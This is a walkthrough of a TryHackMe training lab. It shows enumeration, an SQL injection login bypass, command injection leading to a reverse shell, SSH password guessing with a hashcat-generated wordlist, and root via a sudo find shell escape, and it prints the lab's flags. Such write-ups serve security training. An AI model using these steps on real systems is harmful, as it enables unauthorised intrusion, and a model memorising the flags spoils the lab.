# Operation Promotion - TryHackMe Walkthrough

## Machine Information

| Category         | Value                      |
| ---------------- | -------------------------- |
| Platform         | TryHackMe                  |
| Room Name        | Operation Promotion        |
| Difficulty       | Easy                       |
| Operating System | Linux                      |
| Objective        | Obtain User and Root Flags |

---

# Scenario

You are up for promotion at Hadron Security. Your senior lead, Mara, has handed you a solo engagement against RecruitCorp, a small recruiting firm with a public-facing portal.

Your objective is to:

* Enumerate the target
* Gain initial access
* Escalate privileges
* Capture both flags

Target IP:

```text
10.49.137.12
```

---

# Reconnaissance

## Initial Nmap Scan

We begin with a full TCP port scan.

```bash
nmap -p- --min-rate 5000 -T4 10.49.137.12
```

### Results

```text
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Interesting.

The target exposes:

* SSH
* HTTP
* SMB

This provides multiple avenues for enumeration.

---

## Service Enumeration

Perform service and version detection.

```bash
nmap -sCV -p22,80,139,445 10.49.137.12
```

### Results

```text
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu
80/tcp  open  http        Apache httpd 2.4.58
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
```

Additional findings:

```text
robots.txt
/admin/
```

The robots file immediately points toward an administrative portal.

---

# SMB Enumeration

Using Enum4Linux:

```bash
enum4linux -U 10.49.137.12
```

Output reveals:

```text
RECRUITCORP
WORKGROUP
```

And an automatically generated username:

```text
lahoiizy
```

Although not immediately useful, it confirms SMB is functioning and provides additional environmental information.

---

# Web Enumeration

Navigate to:

```text
http://10.49.137.12
```

The site hosts the RecruitCorp careers portal.

Directory enumeration is performed.

```bash
gobuster dir \
-u http://10.49.137.12/ \
-w /usr/share/wordlists/dirb/big.txt
```

### Results

```text
/admin
/robots.txt
/config
```

Most interestingly:

```text
/admin/
```

---

# Admin Portal

Browsing to:

```text
http://10.49.137.12/admin/
```

reveals a login page.

Testing the login functionality quickly identifies a SQL Injection vulnerability.

Authentication bypass succeeds, granting access to the administration dashboard.

---

# Internal Application Enumeration

Once inside the dashboard, additional functionality becomes available.

While browsing the application, a user lookup endpoint is discovered:

```text
/admin/users/lookup.php?id=7
```

The application returns:

```text
User Lookup

ID: 7
Username: sysmaint
Role: system

Notes:
Service account for /admin/sysmaint-checks/ping.php.
Do not disable.
```

This note exposes another internal application component.

---

# Command Injection Discovery

The referenced endpoint:

```text
/admin/sysmaint-checks/ping.php
```

accepts a parameter:

```text
host=
```

Testing reveals that user-supplied input is executed by the underlying operating system.

This results in command injection and provides remote code execution.

---

# Initial Access

After confirming command execution, a reverse shell is obtained.

Listener:

```bash
nc -lvnp 4445
```

Connection received:

```text
whoami

www-data
```

Initial foothold achieved.

---

# Shell Stabilization

Upgrade the shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background shell:

```bash
CTRL + Z
```

Attacker machine:

```bash
stty raw -echo
fg
```

Target:

```bash
export TERM=xterm
```

We now have a fully interactive shell.

---

# Local Enumeration

Searching application files reveals:

```bash
cat /var/www/html/config/db.conf
```

Contents:

```text
db_host=localhost
db_name=recruitcorp
db_user=jford
db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq
db_engine=sqlite3
```

Interesting.

We now possess:

```text
Username: jford
Password Hash: bcrypt
```

---

# Credential Recovery

The password policy appears to follow a predictable seasonal pattern.

A custom wordlist is generated from:

```text
spring2026
```

Example:

```bash
echo "spring2026" > base.txt

hashcat --stdout base.txt \
-r /usr/share/hashcat/rules/dive.rule \
> wordlist.txt
```

The generated candidates are then used against SSH authentication.

Successful credentials discovered:

```text
Username: jford
Password: spring2026!
```

---

# SSH Access

Connect via SSH.

```bash
ssh jford@10.49.137.12
```

Password:

```text
spring2026!
```

Verify access:

```bash
whoami
```

Output:

```text
jford
```

---

# User Flag

Read the user flag.

```bash
cat user.txt
```

Output:

```text
THM{bdbee0a91ebcb0b0fafde931223efe09}
```

User access achieved.

---

# Privilege Escalation

Checking sudo permissions:

```bash
sudo -l
```

Output:

```text
User jford may run the following commands:

(root) NOPASSWD:
/usr/bin/find
```

This is a classic privilege escalation opportunity.

---

# Root Access

Using the permitted binary:

```bash
sudo find . -exec /bin/sh \; -quit
```

Verify:

```bash
whoami
```

Output:

```text
root
```

Root shell obtained.

Navigate to:

```bash
cd /root
```

Contents:

```text
flag.txt
```

Read the flag:

```bash
cat flag.txt
```

Output:

```text
THM{d999a1f6319a9c5b48c067dfab314ba2}
```

Root compromise complete.

---

# Flags

## User

```text
THM{bdbee0a91ebcb0b0fafde931223efe09}
```

## Root

```text
THM{d999a1f6319a9c5b48c067dfab314ba2}
```

---

# Attack Path Summary

```text
Nmap Scan
      │
      ▼
Web Enumeration
      │
      ▼
/admin Portal
      │
      ▼
Authentication Bypass
      │
      ▼
Admin Dashboard Access
      │
      ▼
User Enumeration
      │
      ▼
sysmaint Account Discovery
      │
      ▼
ping.php Functionality
      │
      ▼
Command Injection
      │
      ▼
Reverse Shell as www-data
      │
      ▼
Database Configuration Discovery
      │
      ▼
Recover jford Credentials
      │
      ▼
SSH Access
      │
      ▼
User Flag
      │
      ▼
sudo -l
      │
      ▼
NOPASSWD: find
      │
      ▼
Root Shell
      │
      ▼
Root Flag
```

---

# Key Takeaways

* Robots.txt files can expose sensitive application paths.
* Administrative portals should never rely solely on client-side validation.
* Internal application notes often reveal hidden attack surfaces.
* Command injection remains one of the most dangerous web vulnerabilities.
* Configuration files frequently contain credentials or password hashes.
* Predictable password generation patterns can lead to successful credential attacks.
* Always review sudo permissions during Linux privilege escalation.
* Misconfigured sudo rules are among the most common paths to root access.

Machine rooted successfully.
